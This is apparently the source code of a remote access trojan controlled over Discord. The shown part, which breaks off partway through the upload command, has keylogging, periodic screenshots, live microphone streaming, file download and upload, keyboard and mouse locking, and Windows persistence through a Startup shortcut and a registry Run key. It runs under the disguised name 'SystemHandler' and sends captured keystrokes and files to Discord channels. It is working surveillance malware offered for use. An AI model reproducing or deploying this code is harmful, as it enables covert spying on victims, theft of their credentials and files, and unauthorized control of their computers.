import asyncio
import base64
import datetime
import discord
import io
import json
import logging
import os
import platform
import psutil
import shutil
import socket
import subprocess
import sys
import tempfile
import time
from discord.ext import commands
from pathlib import Path

# Import optional modules with error handling
try:
    from PIL import ImageGrab
    IMAGEGRAB_AVAILABLE = True
except ImportError:
    print("Warning: PIL.ImageGrab not available. Screen capture will be disabled.")
    IMAGEGRAB_AVAILABLE = False

# Try to import keyboard/mouse control modules
try:
    from pynput import keyboard, mouse
    from pynput.keyboard import Key, Listener as KeyboardListener
    from pynput.mouse import Button, Controller as MouseController
    KEYBOARD_MOUSE_CONTROL_AVAILABLE = True
    mouse_controller = MouseController()
except ImportError:
    print("Warning: pynput module not available. Keyboard/mouse control and keylogging will be disabled.")
    KEYBOARD_MOUSE_CONTROL_AVAILABLE = False
except Exception as e:
    print(f"Warning: Error initializing input control: {e}")
    KEYBOARD_MOUSE_CONTROL_AVAILABLE = False

# Try to import audio modules
try:
    import pyaudio
    AUDIO_AVAILABLE = True
except ImportError:
    print("Warning: PyAudio not available. Microphone streaming will be disabled.")
    AUDIO_AVAILABLE = False

# Check for winreg (Windows only)
if platform.system() == "Windows":
    try:
        import winreg
        WINREG_AVAILABLE = True
    except ImportError:
        WINREG_AVAILABLE = False
else:
    WINREG_AVAILABLE = False

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger('DiscordBot')

# Bot configuration
TOKEN = os.getenv('REPLACE_WITH_BOT_TOKEN', "REPLACE_WITH_BOT_TOKEN")
AUTHORIZED_USER_ID = int(os.getenv('REPLACE_WITH_USER_ID', 'REPLACE_WITH_USER_ID'))
COMMAND_PREFIX = '!'
COMPUTER_NAME = socket.gethostname()
PROCESS_NAME = "SystemHandler"

# Get actual username for Windows startup folder
if platform.system() == "Windows":
    try:
        USER_NAME = os.getlogin()
    except:
        # Fallback to environment variable
        USER_NAME = os.environ.get('USERNAME', 'User')
else:
    USER_NAME = os.environ.get('USER', 'user')

# Create bot instance with required intents
intents = discord.Intents.default()
intents.message_content = True
intents.voice_states = True
bot = commands.Bot(command_prefix=COMMAND_PREFIX, intents=intents)

# Global variables for bot state
screen_streaming = False
streaming_task = None
audio_streaming = False
voice_client = None
keyboard_locked = False
mouse_locked = False
keylogger_active = False
keylogger_channel = None
keylogger_buffer = []
keylogger_listener = None

# Dictionary to track computer-specific channels
computer_channels = {}

# Command help dictionary - show all commands regardless of module availability
CMD_HELP = {
    f"{COMMAND_PREFIX}help": "List all available commands",
    f"{COMMAND_PREFIX}info": "Display system information",
    f"{COMMAND_PREFIX}download [path]": "Download a file from the PC",
    f"{COMMAND_PREFIX}upload [file]": "Upload a file to the PC",
    f"{COMMAND_PREFIX}execute [command]": "Execute a command on the PC",
    f"{COMMAND_PREFIX}screen": "Stream the screen through the bot",
    f"{COMMAND_PREFIX}screen stop": "Stop streaming the screen",
    f"{COMMAND_PREFIX}lock mouse": "Lock the mouse in place",
    f"{COMMAND_PREFIX}lock key": "Lock the keyboard",
    f"{COMMAND_PREFIX}unlock mouse": "Unlock the mouse",
    f"{COMMAND_PREFIX}unlock key": "Unlock the keyboard", 
    f"{COMMAND_PREFIX}keylog": "Create a keylogger channel and start logging keystrokes",
    f"{COMMAND_PREFIX}keylog stop": "Stop the keylogger",
    f"{COMMAND_PREFIX}mic": "Stream microphone audio through the bot",
    f"{COMMAND_PREFIX}mic stop": "Stop streaming microphone audio"
}

# Add Windows-specific commands
if platform.system() == "Windows":
    CMD_HELP.update({
        f"{COMMAND_PREFIX}startup": "Add the bot to startup to run when the computer starts",
        f"{COMMAND_PREFIX}panic": "Completely remove the bot from the computer"
    })

@bot.event
async def on_ready():
    """Event handler for when the bot is connected and ready"""
    logger.info(f"Bot connected as {bot.user}")
    
    # Initialize the computer_channels dictionary to track which channels belong to which computers
    global computer_channels
    
    # Find or create a control channel for this computer
    for guild in bot.guilds:
        # Find all computer categories in the guild
        all_computer_categories = [category for category in guild.categories 
                                  if category.name.startswith("PC-") or 
                                   category.name == COMPUTER_NAME]
        
        # If no categories found, create one for this computer
        if not all_computer_categories or not any(cat.name == COMPUTER_NAME for cat in all_computer_categories):
            category = await guild.create_category(name=COMPUTER_NAME)
            logger.info(f"Created category: {COMPUTER_NAME}")
        else:
            # Get the category for this computer
            category = discord.utils.get(guild.categories, name=COMPUTER_NAME)
            if not category and all_computer_categories:
                # If no category with COMPUTER_NAME but other computer categories exist,
                # use the first one as an example
                category = await guild.create_category(name=COMPUTER_NAME)
        
        # Create control channel if it doesn't exist
        channel_name = f"control-{COMPUTER_NAME.lower()}"
        control_channel = discord.utils.get(guild.text_channels, name=channel_name)
        
        if not control_channel and category:
            control_channel = await category.create_text_channel(name=channel_name)
            logger.info(f"Created control channel: {channel_name}")
        
        if control_channel:
            # Register this channel with this computer
            computer_channels[control_channel.id] = COMPUTER_NAME
            logger.info(f"Registered channel {control_channel.id} for computer {COMPUTER_NAME}")
            
            # Post system info on startup
            await send_system_info(control_channel)
            
            # Notify about bot startup
            startup_embed = discord.Embed(
                title="Bot Started",
                description=f"Bot is now running on {COMPUTER_NAME}",
                color=discord.Color.green(),
                timestamp=datetime.datetime.now()
            )
            startup_embed.add_field(name="Process Name", value=PROCESS_NAME, inline=True)
            startup_embed.add_field(name="PID", value=os.getpid(), inline=True)
            startup_embed.add_field(name="Started At", value=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"), inline=True)
            
            await control_channel.send(embed=startup_embed)

@bot.event
async def on_command_error(ctx, error):
    """Handle command errors"""
    if isinstance(error, commands.CommandNotFound):
        return  # Ignore command not found errors
    
    # Log other errors
    logger.error(f"Command error: {error}")
    
    # Send error message to user
    error_embed = discord.Embed(
        title="Command Error",
        description=str(error),
        color=discord.Color.red(),
        timestamp=datetime.datetime.now()
    )
    await ctx.send(embed=error_embed)

# Remove default help command
bot.remove_command('help')

@bot.command(name="help")
async def show_help(ctx):
    """Display help information about available commands"""
    # Check if user is authorized
    if ctx.author.id != AUTHORIZED_USER_ID:
        return
        
    embed = discord.Embed(
        title="Bot Commands",
        description="List of available commands",
        color=discord.Color.blue(),
        timestamp=datetime.datetime.now()
    )
    
    for cmd, desc in CMD_HELP.items():
        embed.add_field(name=cmd, value=desc, inline=False)
    
    await ctx.send(embed=embed)

@bot.command(name="commands")
async def dummy_commands(ctx):
    """Dummy command that does nothing"""
    # This command intentionally does nothing
    pass

@bot.command(name="info")
async def info_command(ctx):
    """Send system information to the channel"""
    # Check if user is authorized
    if ctx.author.id != AUTHORIZED_USER_ID:
        return
    
    # Check if this command is for this computer
    if ctx.channel.id in computer_channels:
        target_computer = computer_channels[ctx.channel.id]
        if target_computer != COMPUTER_NAME:
            await ctx.send(f"⚠️ This command was sent to {target_computer}, but this is {COMPUTER_NAME}. Command ignored.")
            return
            
    await send_system_info(ctx)

async def send_system_info(ctx):
    """Generate and send system information"""
    system_info = get_system_info()
    embed = discord.Embed(
        title=f"System Information for {COMPUTER_NAME}",
        description="Current system status and information",
        color=discord.Color.blue(),
        timestamp=datetime.datetime.now()
    )
    
    for key, value in system_info.items():
        embed.add_field(name=key, value=value, inline=False)
    
    await ctx.send(embed=embed)

def get_system_info():
    """Collect system information"""
    try:
        info = {
            "OS": platform.platform(),
            "Username": USER_NAME,
            "CPU": platform.processor(),
            "CPU Usage": f"{psutil.cpu_percent()}%",
            "RAM": f"{psutil.virtual_memory().percent}% used",
            "Disk": f"{psutil.disk_usage('/').percent}% used",
            "Python Version": platform.python_version(),
            "IP Address": socket.gethostbyname(socket.gethostname()),
            "Boot Time": datetime.datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S"),
            "Process Name": PROCESS_NAME,
            "Process ID": os.getpid(),
            "User": os.getlogin() if hasattr(os, 'getlogin') else USER_NAME
        }
        
        # Add input control status if available
        if KEYBOARD_MOUSE_CONTROL_AVAILABLE:
            info["Mouse Locked"] = "Yes" if mouse_locked else "No"
            info["Keyboard Locked"] = "Yes" if keyboard_locked else "No"
            info["Keylogger Active"] = "Yes" if keylogger_active else "No"
            
    except Exception as e:
        info = {
            "OS": platform.platform(),
            "Username": USER_NAME,
            "CPU": platform.processor(),
            "Python Version": platform.python_version(),
            "Error": str(e)
        }
        
        # Add input control status if available
        if KEYBOARD_MOUSE_CONTROL_AVAILABLE:
            info["Mouse Locked"] = "Yes" if mouse_locked else "No"
            info["Keyboard Locked"] = "Yes" if keyboard_locked else "No"
            info["Keylogger Active"] = "Yes" if keylogger_active else "No"
            
    return info

if AUDIO_AVAILABLE:
    @bot.command(name="mic")
    async def mic_command(ctx, action=None):
        """Stream microphone audio to voice channel"""
        # Check if user is authorized
        if ctx.author.id != AUTHORIZED_USER_ID:
            return
        
        # Check if this command is for this computer
        if ctx.channel.id in computer_channels:
            target_computer = computer_channels[ctx.channel.id]
            if target_computer != COMPUTER_NAME:
                await ctx.send(f"⚠️ This command was sent to {target_computer}, but this is {COMPUTER_NAME}. Command ignored.")
                return
        
        global audio_streaming, voice_client
        
        if action == "stop":
            if audio_streaming:
                audio_streaming = False
                if voice_client and voice_client.is_connected():
                    if voice_client.is_playing():
                        voice_client.stop()
                    await voice_client.disconnect()
                    voice_client = None
                await ctx.send("🎤 Microphone streaming stopped.")
            else:
                await ctx.send("❌ No microphone streaming is active.")
            return
        
        # Check if the user is in a voice channel
        if not ctx.author.voice:
            await ctx.send("❌ You must be in a voice channel to use this command.")
            return
        
        # Check if already streaming
        if audio_streaming:
            await ctx.send("❌ Already streaming microphone. Use `!mic stop` to stop.")
            return
        
        # Join the user's voice channel
        try:
            voice_channel = ctx.author.voice.channel
            voice_client = await voice_channel.connect()
            await ctx.send(f"🎤 Connected to voice channel: {voice_channel.name}")
            
            # Start streaming audio
            audio_streaming = True
            asyncio.create_task(stream_microphone(ctx))
        except Exception as e:
            await ctx.send(f"❌ Failed to connect to voice channel: {e}")
            logger.error(f"Voice connection error: {e}")

    async def stream_microphone(ctx):
        """Stream microphone audio to the connected voice channel"""
        global audio_streaming, voice_client
        
        try:
            # Configure PyAudio for microphone streaming
            CHUNK = 1024
            FORMAT = pyaudio.paInt16
            CHANNELS = 1
            RATE = 48000  # Discord voice standard rate
            
            p = pyaudio.PyAudio()
            
            # Open microphone stream
            stream = p.open(format=FORMAT,
                          channels=CHANNELS,
                          rate=RATE,
                          input=True,
                          frames_per_buffer=CHUNK)
            
            await ctx.send("🎤 Microphone streaming started. Live audio is now being transmitted.")
            
            # Create an audio source that reads from the microphone
            class MicrophoneSource(discord.AudioSource):
                def __init__(self):
                    self.started = False
                
                def read(self):
                    if not audio_streaming:
                        return b''
                    # Read data from microphone
                    try:
                        data = stream.read(CHUNK, exception_on_overflow=False)
                        return data
                    except Exception as e:
                        logger.error(f"Error reading from microphone: {e}")
                        return b''
                        
                def cleanup(self):
                    stream.stop_stream()
                    stream.close()
                    p.terminate()
            
            # Create an audio source from the microphone
            source = MicrophoneSource()
            
            # Play the audio source if voice client is available
            if voice_client:
                voice_client.play(discord.PCMAudio(source))
            
            # Keep the connection open while streaming
            while audio_streaming and voice_client and voice_client.is_connected():
                await asyncio.sleep(0.5)  # Check status every half second
                
            # Clean up resources
            if voice_client and voice_client.is_connected():
                if voice_client.is_playing():
                    voice_client.stop()
                await voice_client.disconnect()
                voice_client = None
                
            source.cleanup()
            audio_streaming = False
            await ctx.send("🎤 Microphone streaming ended.")
            
        except Exception as e:
            audio_streaming = False
            if voice_client and voice_client.is_connected():
                await voice_client.disconnect()
                voice_client = None
            await ctx.send(f"❌ Error in microphone streaming: {e}")

if IMAGEGRAB_AVAILABLE:
    @bot.command(name="screen")
    async def screen_command(ctx, action=None):
        """Stream the screen to the Discord channel"""
        # Check if user is authorized
        if ctx.author.id != AUTHORIZED_USER_ID:
            return
        
        # Check if this command is for this computer
        if ctx.channel.id in computer_channels:
            target_computer = computer_channels[ctx.channel.id]
            if target_computer != COMPUTER_NAME:
                await ctx.send(f"⚠️ This command was sent to {target_computer}, but this is {COMPUTER_NAME}. Command ignored.")
                return
        
        global screen_streaming, streaming_task
        
        if action in ["off", "stop"]:
            if screen_streaming:
                screen_streaming = False
                if streaming_task:
                    streaming_task.cancel()
                    streaming_task = None
                await ctx.send("🖥️ Screen streaming stopped.")
            else:
                await ctx.send("❌ No screen streaming is active.")
            return
        
        # Check if already streaming
        if screen_streaming:
            await ctx.send("❌ Already streaming screen. Use `!screen stop` to stop.")
            return
        
        # Start screen streaming
        screen_streaming = True
        streaming_task = asyncio.create_task(stream_screen(ctx))
        await ctx.send("🖥️ Screen streaming started. Screenshots will be sent every 2 seconds.")

    async def stream_screen(ctx):
        """Capture and stream screen to Discord channel"""
        global screen_streaming
        
        try:
            counter = 0
            while screen_streaming:
                # Capture screen
                screenshot = ImageGrab.grab()
                imgbytes = io.BytesIO()
                screenshot.save(imgbytes, format='PNG')
                imgbytes.seek(0)
                
                # Send screenshot every 2 seconds
                counter += 1
                if counter % 2 == 0:  # Send every 2nd frame to avoid rate limits
                    file = discord.File(imgbytes, filename="screen.png")
                    
                    embed = discord.Embed(
                        title=f"Screen Capture from {COMPUTER_NAME}",
                        description=f"Captured at {datetime.datetime.now().strftime('%H:%M:%S')}",
                        color=discord.Color.blue(),
                        timestamp=datetime.datetime.now()
                    )
                    embed.set_image(url="attachment://screen.png")
                    
                    await ctx.send(file=file, embed=embed)
                
                # Sleep to limit frame rate
                await asyncio.sleep(1)
        
        except asyncio.CancelledError:
            logger.info("Screen streaming task cancelled.")
        except Exception as e:
            screen_streaming = False
            logger.error(f"Error in screen streaming: {e}")
            await ctx.send(f"❌ Error in screen streaming: {e}")

if platform.system() == "Windows" and WINREG_AVAILABLE:
    @bot.command(name="startup")
    async def startup_command(ctx):
        """Add the bot to startup to run when the computer starts"""
        # Check if user is authorized
        if ctx.author.id != AUTHORIZED_USER_ID:
            return
        
        # Check if this command is for this computer
        if ctx.channel.id in computer_channels:
            target_computer = computer_channels[ctx.channel.id]
            if target_computer != COMPUTER_NAME:
                await ctx.send(f"⚠️ This command was sent to {target_computer}, but this is {COMPUTER_NAME}. Command ignored.")
                return
        
        # Attempt to add to startup
        try:
            # Get the path of the current script
            if getattr(sys, 'frozen', False):
                # If running as an executable
                app_path = sys.executable
            else:
                # If running as a script
                app_path = os.path.abspath(__file__)
                
            # Add to startup based on platform
            success = add_to_startup_windows(app_path)
                
            if success:
                await ctx.send("✅ Successfully added to startup! The bot will now run when the computer starts.")
                # Log the startup registration
                logger.info(f"Added to startup: {app_path}")
            else:
                await ctx.send("❌ Failed to add to startup. Please check logs for more information.")
                
        except Exception as e:
            await ctx.send(f"❌ Error adding to startup: {e}")
            logger.error(f"Startup error: {e}")

    def add_to_startup_windows(app_path):
        """Add the application to Windows startup"""
        try:
            # Multiple methods for Windows persistence
            
            # 1. Startup folder method
            startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
            shortcut_path = os.path.join(startup_folder, f"{PROCESS_NAME}.lnk")
            
            # Use Windows Script Host to create shortcut
            with open("create_shortcut.vbs", "w") as f:
                f.write(f'Set WshShell = CreateObject("WScript.Shell")\n')
                f.write(f'Set shortcut = WshShell.CreateShortcut("{shortcut_path}")\n')
                f.write(f'shortcut.TargetPath = "{app_path}"\n')
                f.write(f'shortcut.WorkingDirectory = "{os.path.dirname(app_path)}"\n')
                f.write(f'shortcut.Description = "System Handler Service"\n')
                f.write(f'shortcut.WindowStyle = 7\n')  # 7 = Minimized
                f.write(f'shortcut.Save\n')
            
            os.system("wscript create_shortcut.vbs")
            os.remove("create_shortcut.vbs")
            
            # 2. Registry Run key method
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE) as registry_key:
                winreg.SetValueEx(registry_key, PROCESS_NAME, 0, winreg.REG_SZ, f'"{app_path}"')
                
            return True
        except Exception as e:
            logger.error(f"Windows startup error: {e}")
            return False

    @bot.command(name="panic")
    async def panic_command(ctx):
        """Completely remove the bot from the computer"""
        # Check if user is authorized
        if ctx.author.id != AUTHORIZED_USER_ID:
            return
        
        # Check if this command is for this computer
        if ctx.channel.id in computer_channels:
            target_computer = computer_channels[ctx.channel.id]
            if target_computer != COMPUTER_NAME:
                await ctx.send(f"⚠️ This command was sent to {target_computer}, but this is {COMPUTER_NAME}. Command ignored.")
                return
        
        # Send confirmation before removing
        await ctx.send("⚠️ WARNING: This will completely remove the bot from this computer. Are you sure? Type `yes` to confirm.")
        
        def check(m):
            return m.author.id == ctx.author.id and m.channel.id == ctx.channel.id and m.content.lower() == "yes"
        
        try:
            # Wait for confirmation
            await bot.wait_for('message', check=check, timeout=30.0)
            
            # User confirmed, proceed with removal
            await ctx.send("🔄 Removing bot from the system...")
            
            # Stop any active processes
            global screen_streaming, audio_streaming, keylogger_active
            screen_streaming = False
            audio_streaming = False
            
            if keylogger_active and KEYBOARD_MOUSE_CONTROL_AVAILABLE:
                stop_keylogger()
            
            # Remove from Windows startup
            await remove_from_startup_windows(ctx)
            
            # Final message before shutting down
            await ctx.send("👋 Bot has been removed from startup and will now exit. Goodbye!")
            
            # Exit the process
            await bot.close()
            sys.exit(0)
            
        except asyncio.TimeoutError:
            await ctx.send("❌ Confirmation timeout. Panic mode aborted.")

    async def remove_from_startup_windows(ctx):
        """Remove the application from Windows startup"""
        try:
            # Remove from startup folder
            startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
            shortcut_path = os.path.join(startup_folder, f"{PROCESS_NAME}.lnk")
            
            if os.path.exists(shortcut_path):
                os.remove(shortcut_path)
                
            # Remove from registry
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            
            try:
                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE) as registry_key:
                    winreg.DeleteValue(registry_key, PROCESS_NAME)
            except FileNotFoundError:
                pass  # Key doesn't exist, which is fine
                
            await ctx.send("✅ Removed from Windows startup")
        except Exception as e:
            await ctx.send(f"❌ Error removing from Windows startup: {e}")

if KEYBOARD_MOUSE_CONTROL_AVAILABLE:
    @bot.command(name="lock")
    async def lock_command(ctx, target=None):
        """Lock the keyboard or mouse"""
        # Check if user is authorized
        if ctx.author.id != AUTHORIZED_USER_ID:
            return
        
        # Check if this command is for this computer
        if ctx.channel.id in computer_channels:
            target_computer = computer_channels[ctx.channel.id]
            if target_computer != COMPUTER_NAME:
                await ctx.send(f"⚠️ This command was sent to {target_computer}, but this is {COMPUTER_NAME}. Command ignored.")
                return
        
        if not target or target.lower() not in ["mouse", "key", "keyboard"]:
            await ctx.send("❌ Please specify what to lock: `!lock mouse` or `!lock key`")
            return
        
        if target.lower() == "mouse":
            await lock_mouse(ctx)
        elif target.lower() in ["key", "keyboard"]:
            await lock_keyboard(ctx)

    @bot.command(name="unlock")
    async def unlock_command(ctx, target=None):
        """Unlock the keyboard or mouse"""
        # Check if user is authorized
        if ctx.author.id != AUTHORIZED_USER_ID:
            return
        
        # Check if this command is for this computer
        if ctx.channel.id in computer_channels:
            target_computer = computer_channels[ctx.channel.id]
            if target_computer != COMPUTER_NAME:
                await ctx.send(f"⚠️ This command was sent to {target_computer}, but this is {COMPUTER_NAME}. Command ignored.")
                return
        
        if not target or target.lower() not in ["mouse", "key", "keyboard"]:
            await ctx.send("❌ Please specify what to unlock: `!unlock mouse` or `!unlock key`")
            return
        
        if target.lower() == "mouse":
            await unlock_mouse(ctx)
        elif target.lower() in ["key", "keyboard"]:
            await unlock_keyboard(ctx)

    async def lock_keyboard(ctx):
        """Lock the keyboard by suppressing all key presses"""
        global keyboard_locked, keylogger_listener
        
        if keyboard_locked:
            await ctx.send("❌ Keyboard is already locked.")
            return
        
        try:
            # Setup keyboard listener to block all keys
            def on_key_press(key):
                # Block all key presses
                return False
            
            keyboard_listener = KeyboardListener(on_press=on_key_press)
            keyboard_listener.start()
            keyboard_locked = True
            
            await ctx.send("🔒 Keyboard locked. All key presses are now blocked.")
            logger.info("Keyboard locked")
        except Exception as e:
            await ctx.send(f"❌ Error locking keyboard: {e}")
            logger.error(f"Keyboard lock error: {e}")

    async def unlock_keyboard(ctx):
        """Unlock the keyboard"""
        global keyboard_locked, keylogger_listener
        
        if not keyboard_locked:
            await ctx.send("❌ Keyboard is not locked.")
            return
        
        try:
            # Stop the keyboard listener if it exists
            if keylogger_listener:
                keylogger_listener.stop()
                keylogger_listener = None
            
            keyboard_locked = False
            await ctx.send("🔓 Keyboard unlocked. Key presses are now allowed.")
            logger.info("Keyboard unlocked")
        except Exception as e:
            await ctx.send(f"❌ Error unlocking keyboard: {e}")
            logger.error(f"Keyboard unlock error: {e}")

    async def lock_mouse(ctx):
        """Lock the mouse in place"""
        global mouse_locked, mouse_position, mouse_listener
        
        if mouse_locked:
            await ctx.send("❌ Mouse is already locked.")
            return
        
        try:
            # Get current mouse position
            mouse_position = mouse_controller.position
            
            # Create a listener to reset position on mouse movement
            def on_move(x, y):
                if mouse_locked:
                    mouse_controller.position = mouse_position
                    return False
                return True
                
            # Create and start the mouse listener
            mouse_listener = mouse.Listener(on_move=on_move)
            mouse_listener.start()
            
            mouse_locked = True
            await ctx.send(f"🔒 Mouse locked at position {mouse_position}. Mouse movement is now blocked.")
            logger.info(f"Mouse locked at position {mouse_position}")
        except Exception as e:
            await ctx.send(f"❌ Error locking mouse: {e}")
            logger.error(f"Mouse lock error: {e}")

    async def unlock_mouse(ctx):
        """Unlock the mouse"""
        global mouse_locked, mouse_listener
        
        if not mouse_locked:
            await ctx.send("❌ Mouse is not locked.")
            return
        
        try:
            # Stop the mouse listener if it exists
            if mouse_listener:
                mouse_listener.stop()
                mouse_listener = None
            
            mouse_locked = False
            await ctx.send("🔓 Mouse unlocked. Movement is now allowed.")
            logger.info("Mouse unlocked")
        except Exception as e:
            await ctx.send(f"❌ Error unlocking mouse: {e}")
            logger.error(f"Mouse unlock error: {e}")

    @bot.command(name="keylog")
    async def keylog_command(ctx, action=None):
        """Start or stop the keylogger"""
        # Check if user is authorized
        if ctx.author.id != AUTHORIZED_USER_ID:
            return
        
        # Check if this command is for this computer
        if ctx.channel.id in computer_channels:
            target_computer = computer_channels[ctx.channel.id]
            if target_computer != COMPUTER_NAME:
                await ctx.send(f"⚠️ This command was sent to {target_computer}, but this is {COMPUTER_NAME}. Command ignored.")
                return
        
        global keylogger_active
        
        # Check for required modules
        if not KEYBOARD_MOUSE_CONTROL_AVAILABLE:
            await ctx.send("❌ Keyboard tracking module is not available. Keylogger cannot be started.")
            await ctx.send("ℹ️ When running on Windows with the build script, this feature will work.")
            return
        
        if action and action.lower() == "stop":
            if keylogger_active:
                stop_keylogger()
                await ctx.send("🛑 Keylogger stopped.")
            else:
                await ctx.send("❌ Keylogger is not active.")
            return
        
        # Check if already running
        if keylogger_active:
            await ctx.send("❌ Keylogger is already running. Use `!keylog stop` to stop.")
            return
        
        # Create a dedicated channel for keylogging if it doesn't exist
        try:
            # Get the guild and category
            guild = ctx.guild
            category = discord.utils.get(guild.categories, name=COMPUTER_NAME)
            
            if not category:
                category = await guild.create_category(name=COMPUTER_NAME)
            
            # Create keylog channel
            channel_name = f"keylog-{COMPUTER_NAME.lower()}"
            keylog_channel = discord.utils.get(guild.text_channels, name=channel_name)
            
            if not keylog_channel:
                keylog_channel = await category.create_text_channel(name=channel_name)
                await keylog_channel.send("🔑 **Keylogger Started**")
                await keylog_channel.send("All keystrokes from the target computer will appear here in real-time.")
                await keylog_channel.send("─────────────────────────────")
            else:
                await keylog_channel.send("🔑 **Keylogger Restarted**")
                await keylog_channel.send("─────────────────────────────")
            
            # Start the keylogger
            await start_keylogger(ctx, keylog_channel)
            await ctx.send(f"✅ Keylogger started. All keystrokes will be sent to {keylog_channel.mention} in real-time.")
            
        except Exception as e:
            await ctx.send(f"❌ Error setting up keylogger: {e}")
            logger.error(f"Keylogger setup error: {e}")

    async def start_keylogger(ctx, channel):
        """Start the keylogger to capture keystrokes"""
        global keylogger_active, keylogger_channel, keylogger_buffer, keylogger_listener
        
        try:
            keylogger_channel = channel
            keylogger_buffer = []
            
            # Send initial message
            await ctx.send(f"🔑 Keylogger started. Keystrokes will be sent to {channel.mention}")
            await keylogger_channel.send(f"🔑 Keylogger started on {COMPUTER_NAME} at {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            
            # Setup keyboard listener
            def on_key_press(key):
                """Callback for key press events"""
                if not keylogger_active:
                    return False
                
                try:
                    # Convert key to string representation
                    if hasattr(key, 'char'):
                        if key.char:
                            key_str = key.char
                        else:
                            key_str = f'[{key}]'
                    else:
                        key_str = f'[{key}]'
                    
                    # Special handling for some keys
                    if key == Key.space:
                        key_str = ' '
                    elif key == Key.enter:
                        key_str = '\n'
                    elif key == Key.tab:
                        key_str = '\t'
                    
                    # Add to buffer
                    keylogger_buffer.append(key_str)
                    
                    # If buffer gets too long or contains sensitive patterns, flush immediately
                    if len(keylogger_buffer) > 50 or '\n' in key_str:
                        asyncio.create_task(send_keylog_buffer())
                    
                    return True
                except Exception as e:
                    logger.error(f"Error in keylogger callback: {e}")
                    return True
            
            # Create and start keyboard listener
            keylogger_listener = KeyboardListener(on_press=on_key_press)
            keylogger_listener.start()
            
            # Set active flag
            keylogger_active = True
            
            # Start periodic buffer flush task
            asyncio.create_task(periodic_flush())
            
            logger.info(f"Keylogger started, sending to channel {keylogger_channel.id}")
        
        except Exception as e:
            await ctx.send(f"❌ Error starting keylogger: {e}")
            logger.error(f"Keylogger start error: {e}")
            keylogger_active = False

    async def send_keylog_buffer():
        """Send the accumulated keystrokes to Discord"""
        global keylogger_buffer, keylogger_channel
        
        if not keylogger_buffer or not keylogger_channel:
            return
        
        try:
            # Join buffer into a single string
            keylog_text = ''.join(keylogger_buffer)
            
            # Clear buffer
            keylogger_buffer = []
            
            # Format with timestamp
            timestamp = datetime.datetime.now().strftime('%H:%M:%S')
            message = f"**[{timestamp}]** ```{keylog_text}```"
            
            # Handle message length limit
            if len(message) > 1950:  # Discord has a 2000 char limit
                messages = []
                while len(message) > 1950:
                    split_point = message[:1950].rfind('```')
                    if split_point == -1:
                        split_point = 1950
                    
                    messages.append(message[:split_point])
                    message = f"**[{timestamp}] (continued)** ```{message[split_point:].lstrip('`')}"
                
                messages.append(message)
                
                for msg in messages:
                    await keylogger_channel.send(msg)
            else:
                await keylogger_channel.send(message)
        
        except Exception as e:
            logger.error(f"Error sending keylog buffer: {e}")

    async def periodic_flush():
        """Periodically flush the keylog buffer"""
        while keylogger_active:
            await asyncio.sleep(5)  # Flush every 5 seconds
            if keylogger_buffer:
                await send_keylog_buffer()

    def stop_keylogger():
        """Stop the keylogger"""
        global keylogger_active, keylogger_listener
        
        keylogger_active = False
        
        # Stop the keyboard listener
        if keylogger_listener:
            keylogger_listener.stop()
            keylogger_listener = None
        
        # Flush any remaining keystrokes
        if keylogger_buffer:
            asyncio.create_task(send_keylog_buffer())
        
        logger.info("Keylogger stopped")

@bot.command(name="download")
async def download_command(ctx, *, file_path=None):
    """Download a file from the target computer"""
    # Check if user is authorized
    if ctx.author.id != AUTHORIZED_USER_ID:
        return
    
    # Check if this command is for this computer
    if ctx.channel.id in computer_channels:
        target_computer = computer_channels[ctx.channel.id]
        if target_computer != COMPUTER_NAME:
            await ctx.send(f"⚠️ This command was sent to {target_computer}, but this is {COMPUTER_NAME}. Command ignored.")
            return
    
    if not file_path:
        await ctx.send("❌ Please specify a file path to download.")
        return
    
    # Expand user directory if path starts with ~
    file_path = os.path.expanduser(file_path)
    
    # Check if file exists
    if not os.path.exists(file_path):
        await ctx.send(f"❌ File not found: {file_path}")
        return
    
    # Check file size (Discord has 8MB limit for regular users, 50MB for nitro)
    max_size = 8 * 1024 * 1024  # 8MB in bytes
    
    try:
        file_size = os.path.getsize(file_path)
        if file_size > max_size:
            await ctx.send(f"❌ File is too large ({file_size / 1024 / 1024:.2f} MB). Maximum size is 8MB.")
            return
            
        # Get the file name from the path
        file_name = os.path.basename(file_path)
        
        # Send the file
        await ctx.send(f"📤 Downloading file: {file_name}")
        
        file = discord.File(file_path, filename=file_name)
        await ctx.send(file=file)
        
        await ctx.send(f"✅ File downloaded: {file_name} ({file_size / 1024:.2f} KB)")
        
    except Exception as e:
        await ctx.send(f"❌ Error downloading file: {e}")
        logger.error(f"File download error: {e}")

@bot.command(name="upload")
async def upload_command(ctx, *, file_path=None):
    """Upload a file to the target computer"""
    # Check if user is authorized
    if ctx.author.id != AUTHORIZED_USER_ID:
        return
    
    # Check if this command is for this computer
    if ctx.channel.id in computer_channels:
        target_computer = computer_channels[ctx.channel.id]
        if target_computer != COMPUTER_NAME:
            await ctx.send(f"⚠️ This command was sent to {target_computer}, but this is {COMPUTER_NAME}. Command ignored.")
            return
    
    if not file_path:
        await ctx.send("❌ Please specify a destination path for the uploaded file. Then attach the file to your next message.")
        return
    
    # Expand user directory if path starts with ~
    dest_path = os.path.expanduser(file_path)
    
    # Check if the destination directory exists
    dest_dir = os.path.dirname(dest_path)
    if dest_dir and not os.path.exists(dest_dir):
        try:
            os.makedirs(dest_dir, exist_ok=True)
            await ctx.send(f"📁 Created directory: {dest_dir}")
        except Exception as e:
            await ctx.send(f"❌ Error creating directory {dest_dir}: {e}")
            return
    
    # Wait for the file attachment
    await ctx.send("📤 Please attach the file to upload in your next message...")
    
    def check(m):
        return m.author.id == ctx.author.id and m.channel.id == ctx.channel.id and len(m.attachments) > 0
    
    try:
        # Wait for message with attachment
        message = await bot.wait_for('message', check=check, timeout=60.0)
        
        # Get the first attachment
        attachment = message.attachments[0]
        
        # Download the attachment to the specified path
